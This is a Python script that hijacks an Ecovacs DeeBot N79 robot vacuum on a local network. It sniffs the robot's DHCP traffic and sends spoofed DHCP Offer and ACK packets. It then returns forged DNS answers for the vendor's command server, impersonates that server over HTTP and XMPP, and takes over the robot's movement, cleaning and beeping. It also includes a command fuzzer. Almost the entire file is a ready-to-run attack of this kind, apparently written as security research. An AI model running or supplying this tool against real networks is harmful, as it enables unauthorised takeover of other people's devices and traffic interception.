#!/usr/bin/python

import socket, sys, binascii, re, os, datetime, termios, tty
from struct import *
from time import sleep

'''
Sniffer to listen for specific packets
'''
class Sniffer:
    def __init__(self):
        self.mac_addr = ""

    '''
    Create human readable MAC from received packets
    '''
    def mac(self,a):
        b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
        return b

    '''
    Sniff specifically for Espressif DHCP requests
    '''
    def sniff(self):
        try:
            s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
        except socket.error, msg:
            print 'Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage : ' + msg[1]
            sys.exit()
    
        while True:
            packet = s.recvfrom(65536)
            packet = packet[0]
            eth_hdr_length = 14
            eth_header = packet[:eth_hdr_length]
            eth = unpack('!6s6sH', eth_header)
            eth_proto = socket.ntohs(eth[2])
            dst_mac = self.mac(packet[0:6])
            src_mac = self.mac(packet[6:12])
            self.mac_addr = src_mac
    
            if src_mac.startswith('2c:3a:e8'):
                print '[*] Found Ecovacs DeeBot N79 at ' + src_mac

                if eth_proto == 8:
                    ip_header = packet[eth_hdr_length:20+eth_hdr_length]
                    iph = unpack('!BBHHHBBH4s4s', ip_header)
                    version_ihl = iph[0]
                    version = version_ihl >> 4
                    ihl = version_ihl & 0xF
                    iph_length = ihl * 4
                    ttl = iph[5]
                    proto = iph[6]
                    s_addr = socket.inet_ntoa(iph[8])
                    d_addr = socket.inet_ntoa(iph[9])

                    if proto == 17 :
                        print '[*] This looks like a DHCP packet'
                        u = iph_length + eth_hdr_length
                        udp_hdr_length = 8
                        udp_header = packet[u:u+8]
                        udph = unpack('!HHHH', udp_header)
                        src_port = udph[0]
                        dst_port = udph[1]
                        length = udph[2]
                        checksum = udph[3]
                        h_size = eth_hdr_length + iph_length + udp_hdr_length
                        data_size = len(packet) - h_size
                        data = packet[h_size:]
                        # Search for DHCP Message Type
                        udata = binascii.hexlify(data[240:243])
                        if udata == '350101':
                            print '[*] Confirmed DHCP Discover packet, sending spoofed DHCP Offer'
                            s.close()
                            break
                        elif udata == '350103':
                            print '[*] Confirmed DHCP Request packet, sending spoofed DHCP ACK'
                            s.close()
                            break

'''
Handles C&C server impersonation
'''
class Spoofer:
    def __init__(self):
        self.connection = ''

    '''
    Listen for DHCP Discovery from any Espressif mac address likely to be robot.
    '''
    def dhcp_disc(self,mac,sip,tip,nmask):
        srv_port = 67
        tar_port = 68
        srv_ip = binascii.unhexlify(binascii.hexlify(socket.inet_aton(sip)))
        tar_ip = binascii.unhexlify(binascii.hexlify(socket.inet_aton(tip)))
        netmask = binascii.unhexlify(binascii.hexlify(socket.inet_aton(nmask)))
        mac = re.sub(':', '', mac)
        hex_mac = binascii.unhexlify(mac)

        payload = "\x02" #Boot Reply
        payload += "\x01" #Hardware Type (Ethernet)
        payload += "\x06" #Hardware Address Length
        payload += "\x00" #Hops
        payload += "\xab\xcd\x00\x01" #Transaction ID
        payload += "\x00\x00" #Seconds Elapsed
        payload += "\x80\x00" #Broadcast Flag
        payload += "\x00\x00\x00\x00" #Client IP Address
        payload += tar_ip #Your (client) IP Address
        payload += srv_ip #Next Server IP Address
        payload += "\x00\x00\x00\x00" #Relay Agent IP Address
        payload += hex_mac #Client Mac Address
        payload += "\x00" * 10 #Client Hardware Addr Padding
        payload += "\x00" * 192 #Server host name and boot file
        payload += "\x63\x82\x53\x63" #Magic Cookie: DHCP
        payload += "\x35\x01\x02" #DHCP Message Type (Offer)
        payload += "\x36\x04" #DHCP Server Identifier Option Start
        payload += srv_ip #IP for DHCP Server Identifier
        payload += "\x33\x04\x00\x01\x51\x80" #IP Address Lease Time
        payload += "\x3a\x04\x00\x00\xa8\xc0" #Renewal Time Value
        payload += "\x3b\x04\x00\x01\x27\x50" #Rebinding Time Value
        payload += "\x06\x04" #Domain Name Server Option Start
        payload += srv_ip #IP for Domain Name Server
        payload += "\x03\x04" #Router Option Start
        payload += srv_ip #IP for Router
        payload += "\x01\x04" #Subnet Mask Option Start
        payload += netmask #Subnet Mask
        payload += "\xff" #End
        payload += "\x00" * 258 #Padding

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.bind((sip, srv_port))
            s.sendto(payload, ('255.255.255.255', tar_port))
            print "[*] Sent DHCP Offer payload"
            s.close()
        except socket.error, msg:
            print '[!] Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage : ' + msg[1]

    '''
    Create a static ARP entry for the robot that was found.  This entry will be used to send the DHCP ACK.
    '''
    def set_arp(self,mac,tip):
        os.system('arp -s ' + tip + ' ' + mac)
        print "[*] Added static ARP entry for DHCP ACK"

    '''
    Send DHCP ACK so the robot assigns the desired IP address/Router/DNS/etc
    '''
    def dhcp_ack(self,mac,sip,tip,nmask):
        srv_port = 67
        tar_port = 68
        srv_ip = binascii.unhexlify(binascii.hexlify(socket.inet_aton(sip)))
        tar_ip = binascii.unhexlify(binascii.hexlify(socket.inet_aton(tip)))
        netmask = binascii.unhexlify(binascii.hexlify(socket.inet_aton(nmask)))
        mac = re.sub(':', '', mac)
        hex_mac = binascii.unhexlify(mac)

        payload = "\x02" #Boot Reply
        payload += "\x01" #Hardware Type (Ethernet)
        payload += "\x06" #Harwadre Address Length
        payload += "\x00" #Hops
        payload += "\xab\xcd\x00\x01" #Transaction ID
        payload += "\x00\x00" #Seconds Elapsed
        payload += "\x00\x00" #Bootp flags
        payload += "\x00\x00\x00\x00" #Client IP Address
        payload += tar_ip #Your (client) IP Address
        payload += srv_ip #Next Server IP Address
        payload += "\x00\x00\x00\x00" #Relay Agent IP Address
        payload += hex_mac #Client MAC Address
        payload += "\x00" * 10 #Client Hardware Address Padding
        payload += "\x00" * 192 #Server host name and boot file
        payload += "\x63\x82\x53\x63" #Magic Cookie: DHCP
        payload += "\x35\x01\x05" #DHCP Message Type (ACK)
        payload += "\x36\x04" #DHCP Server Identifier Option Start
        payload += srv_ip #IP for DHCP Server Identifier
        payload += "\x33\x04\x00\x01\x51\x80" #IP Address Lease Time
        payload += "\x3a\x04\x00\x00\xa8\xc0" #Renewal Time Value
        payload += "\x3b\x04\x00\x01\x27\x50" #Rebinding Time Value
        payload += "\x06\x04" #Domain Name Server Option Start
        payload += srv_ip #IP for Domain Name Server
        payload += "\x03\x04" #Router Option Start
        payload += srv_ip #IP for Router
        payload += "\x01\x04" #Subnet Mask Option Start
        payload += netmask #Subnet Mask
        payload += "\xff" #End
        payload += "\x00" * 258 #Padding or 244 with Domain name option set

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind((sip, srv_port))
            s.sendto(payload, (tip, tar_port))
            print "[*] Sent DHCP ACK payload"
            s.close()
        except socket.error, msg:
            print '[!] Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage : ' + msg[1]

    '''
    Listen for DNS requests to the real C&C server and respond with modified answers
    '''
    def dns_serv(self,sip,tip):
        srv_port = 53
        srv_ip = binascii.unhexlify(binascii.hexlify(socket.inet_aton(sip)))
        count = 0

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.bind((sip, srv_port))
        print '[*] Listening for DNS Queries'
        while True:
            try:
                data, address = s.recvfrom(4096)
                tar_port = address[1]
                print '[*] DNS Query received, sending spoofed response'

                payload = data[:2] #Transaction ID
                payload += "\x81\x80" #Flags Start
                payload += "\x00\x01" #Questions
                payload += "\x00\x01" #Answer RRs
                payload += "\x00\x00\x00\x00" #Authority RRs and Additional RRs. Flags End
                payload += "\x03" #Subdomain Length
                payload += "\x6c\x62\x6f" #Subdomain
                payload += "\x07" #Domain Length
                payload += "\x65\x63\x6f\x75\x73\x65\x72" #Domain
                payload += "\x03" #TLD Length
                payload += "\x6e\x65\x74" #Top Level Domain
                payload += "\x00" #Separator/End of domains
                payload += "\x00\x01" #Type A Host Address
                payload += "\x00\x01" #Class IN
                payload += "\xc0\x0c" #Name. Answers Start
                payload += "\x00\x01" #Type A Host Address
                payload += "\x00\x01" #Class IN
                payload += "\x00\x00\x02\x58" #Time to live
                payload += "\x00\x04" #Data Length
                payload += srv_ip #Address

                s.sendto(payload, (tip, tar_port))
                print '[*] Spoofed DNS Response sent'
            except socket.timeout:
                print '[*] No more DNS Queries received'
                s.close()
                break

    '''
    Listen for requests to set desired connection port/IP and respond with desired port/IP
    '''
    def http_serv(self,sip):
        srv_port = 5223
        http_port = 8007
        utc = datetime.datetime.utcnow()
        date = utc.strftime('%a, %d %b %Y %H:%M:%S GMT')

        jpayload = '{"result":"ok",'
        jpayload += '"ip":"' + sip + '",'
        jpayload += '"port":' + str(srv_port) + '}'

        payload = 'HTTP/1.1 200 OK\x0d\x0a'
        payload += 'X-Powered-By: Express\x0d\x0a'
        payload += 'Content-Type: application/json; charset=utf-8\x0d\x0a'
        payload += 'Content-Length: ' + str(len(jpayload)) + '\x0d\x0a'
        payload += 'ETag: W/"2f-fcc6b586"\x0d\x0a'
        payload += 'Date: ' + date + '\x0d\x0a'
        payload += 'Connection: close'
        payload += '\x0d\x0a\x0d\x0a' + jpayload

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((sip, http_port))
        s.listen(1)
        print '[*] Listening for HTTP Request'
        while True:
            try:
                connection, address = s.accept()
                data1 = connection.recv(4096)
                data2 = connection.recv(4096)
                if "EcoMsgNew" in data2:
                    print '[*] HTTP POST Received, connected to target'
                    connection.send(payload)
                    connection.shutdown(socket.SHUT_WR)
                    print '[*] Sent Spoofed 200 OK'
                    break
                else:
                    print '[!] HTTP Request was not POST.  Something isn\'t right.'
                    print '[!] HTTP Request received instead:\n' + data1
                    connection.close()
                    s.close
            except socket.error, msg:
                print '[!] Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage : ' + msg[1]
                s.close
        s.shutdown(socket.SHUT_RDWR)
        sleep(2)
        s.close()

    '''
    Listen on the port set in http_serv and perform auth sequence with the robot
    '''
    def robo_comms(self,sip,tomail,frommail):
        srv_port = 5223

        xmlr1 = '<stream:stream xmlns:stream="http://etherx.jabber.org/streams" xmlns="jabber:client" version="1.0" id="2aa17b8ad3801298a77352b9450a8cbf" from="126.ecorobot.net">'
        xmlr2 = '<stream:features><auth xmlns="http://jabber.org/features/iq-auth"/><starttls xmlns="urn:ietf:params:xml:ns:xmpp-tls"><required/></starttls><mechanisms xmlns="urn:ietf:params:xml:ns:xmpp-sasl"><mechanism>PLAIN</mechanism></mechanisms></stream:features>'
        xmlr3 = '<success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/>'
        xmlr4 = '<stream:features><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"/><session xmlns="urn:ietf:params:xml:ns:xmpp-session"/></stream:features>'
        xmlr7 = '<presence to="' + tomail + '"> dummy </presence>'
        batt_info = '<iq id="6222" to="' + tomail + '" from="' + frommail + '" type="set"><query xmlns="com:ctl"><ctl td="GetBatteryInfo"/></query></iq>'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((sip, srv_port))
        s.listen(1)
        print '[*] Listening for Robot Auth Request'
        try:
            connection, address = s.accept()
            data = connection.recv(4096)
            print '[*] Initiating Auth Sequence'
            connection.send(xmlr1)
            connection.send(xmlr2)
            data = connection.recv(4096)
            connection.send(xmlr3)
            data = connection.recv(4096)
            connection.send(xmlr1)
            connection.send(xmlr4)
            data = connection.recv(4096)
            idno = re.search('id=\'(.+?)\'>', data).group(1)
            xmlr5 = '<iq type="result" id="' + idno + '"><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"><jid>' + tomail + '</jid></bind></iq>'
            connection.send(xmlr5)
            data = connection.recv(4096)
            idno = re.search('id=\'(.+?)\'>', data).group(1)
            xmlr6 = '<iq type="result" id="' + idno + '"/>'
            connection.send(xmlr6)
            data = connection.recv(4096)
            print '[*] Auth Sequence completed'
            connection.send(xmlr7)
            print '[*] Getting current battery level'
            connection.send(batt_info)
            data = connection.recv(4096)
            data = connection.recv(4096)
            print '[*] Battery currently at: ' + data[131:134] + '%'
            self.connection = connection
        except socket.error, msg:
            print '[!] Socket could not be created.\nError Code : ' + str(msg[0]) + '\nMessage : ' + msg[1]

    '''
    Remove static ARP entry used for DHCP ACK
    '''
    def del_arp(self,tip):
        os.system('arp -d ' + tip)
        print '[*] Deleted static ARP entry for target'

'''
Robot movement/job handling
'''
class Action:
    def __init__(self,tomail,frommail):
        self.xmlHead = '<iq id="1337" to="' + tomail + '" from="' + frommail + '" type="set"><query xmlns="com:ctl">'

    '''
    Generate requests for movement types
    '''
    def move(self,moveType):
        # Movement types:
        # forward, SpinLeft, SpinRight, TurnAround, stop
        request = self.xmlHead
        request += '<ctl td="Move"><move action="' + moveType + '"/></ctl></query></iq>'
        return request

    '''
    Generate requests for cleaning jobs
    '''
    def clean(self,cleanType):
        # Clean types:
        # auto/standard, spot/strong, singleRoom/standard, border/strong, stop/strong, stop/standard
        if "auto" in cleanType or "singleRoom" in cleanType:
            request = self.xmlHead
            request += '<ctl td="Clean"><clean type="' + cleanType + '" speed="standard"/></ctl></query></iq>'
            return request
        elif "spot" in cleanType or "border" in cleanType:
            request = self.xmlHead
            request += '<ctl td="Clean"><clean type="' + cleanType + '" speed="strong"/></ctl></query></iq>'
            return request
        elif "stopStrong" in cleanType:
            request = self.xmlHead
            request += '<ctl td="Clean"><clean type="stop" speed="strong"/></ctl></query></iq>'
            return request
        elif "stopStandard" in cleanType:
            request = self.xmlHead
            request = '<ctl td="Clean"><clean type="stop" speed="standard"/></ctl></query></iq>'
            return request

    '''
    Generate request to send robot back to charging base
    '''
    def charge(self):
        request = self.xmlHead
        request += '<ctl td="Charge"><charge type="go"/></ctl></query></iq>'
        return request

    '''
    Generate beep
    '''
    def beep(self):
        request = self.xmlHead
        request += '<ctl id="68088203" td="PlaySound" sid="0"/></query></iq>'
        return request

    '''
    Fuzz possible commands via a list
    '''
    def fuzz(self,fuzzEntry):
        request = self.xmlHead
        request += '<ctl id="68088203" td="' + fuzzEntry + '" sid="0"/></query></iq>'
        return request

    '''
    Make the robot shake its money maker
    '''
    def bootyshake(self,connection):
        i = 0
        print '[*] Proceeding to shake booty'
        while i < 30:
            connection.send(self.move('SpinRight'))
            sleep(.25)
            connection.send(self.move('stop'))
            connection.send(self.move('SpinLeft'))
            sleep(.25)
            connection.send(self.move('stop'))
            i += 1

    '''
    Method for testing commands
    '''
    def test(self,connection):
        i = 0
        print '[*] Starting to pace'
        while i < 10:
            connection.send(self.move('forward'))
            sleep(3)
            connection.send(self.move('TurnAround'))
            sleep(2)
            i += 1

    '''
    Method to send robot home
    '''
    def home(self, connection):
        print '[*] Going home'
        connection.send(self.charge())

    '''
    Manually control the robot
    '''
    def controller(self, connection):
        print 'Controls:\nMove Forward: w\nSpin Left: a\nSpind Right: d\nTurn Around: s\nBeep: b\nQuit: l'
        while True:
            keypress = getkey()

            if (keypress == 'l'):
                print '[!] Stopping!'
                return False

            if (keypress == 'w'):
                connection.send(self.move('forward'))

            elif (keypress == 'a'):
                connection.send(self.move('SpinLeft'))

            elif (keypress == 's'):
                connection.send(self.move('TurnAround'))

            elif (keypress == 'd'):
                connection.send(self.move('SpinRight'))

            elif (keypress == 'b'):
                connection.send(self.beep())

'''
Function to detect key presses
'''
def getkey():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        key = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return key

sip = '192.168.1.150'
tip = '192.168.1.2'
nmask = '255.255.255.0'
tomail = 'longstringhere@126.ecorobot.net/atom'                  # These are your robot's to-from email
frommail = 'anotherlongstringhere@ecouser.net/andanotherstring'  # addresses. Can't send commands without them.

spoof = Spoofer()
sniff = Sniffer()
act = Action(tomail,frommail)

sniff.sniff()
mac = sniff.mac_addr
spoof.dhcp_disc(mac,sip,tip,nmask)
sniff.sniff()
spoof.set_arp(mac,tip)
spoof.dhcp_ack(mac,sip,tip,nmask)
spoof.dns_serv(sip,tip)
spoof.http_serv(sip)
check = True
while check == True:
    try:
        spoof.robo_comms(sip,tomail,frommail)
        check = act.controller(spoof.connection)
    except:
        print "Connection lost, attempting to reconnect..."
spoof.del_arp(tip)
